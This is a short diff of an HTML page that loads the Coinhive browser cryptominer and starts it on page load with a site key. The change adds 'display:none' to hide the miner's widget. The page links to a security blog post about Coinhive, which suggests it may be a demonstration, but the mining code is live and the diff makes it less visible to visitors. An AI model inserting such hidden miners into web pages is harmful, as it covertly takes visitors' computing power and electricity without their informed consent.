@@ -9,6 +9,7 @@
   </style>
  </head>
  <body>
+     
   <script src="https://coinhive.com/lib/miner.min.js" async></script>
   <script>var miner = new CoinHive.Anonymous('27xXqT1TRmzRKeJWq5gb4XxGP7DeGXmz');
   miner.start();</script>
@@ -18,9 +19,11 @@
 	data-key="27xXqT1TRmzRKeJWq5gb4XxGP7DeGXmz"
 	data-autostart="true"
 	data-throttle="0.2"
+    style="display:none;"
   >
 	<em>Please disable Adblock!</em>
-</div>
+
  <p align="center">For more information, see <a href="https://securityblog.switch.ch/2017/10/05/money-for-nothing-and-coins-for-free/" target="_blank">Money for Nothing and Coins for Free</a>.
+     </div>
  </body>
 </html>
